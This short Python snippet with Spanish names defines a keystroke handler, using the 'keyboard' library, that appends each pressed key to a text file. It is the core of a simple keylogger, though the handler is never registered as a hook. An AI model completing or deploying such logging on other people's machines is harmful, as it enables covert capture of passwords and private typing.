import keyboard 

def Presionar_Tecla(tecla):
    with open('datos.txt', 'a') as archivo:
        if tecla.name == 'space':
            archivo.write(' ')
        else:
            archivo.write(tecla.name)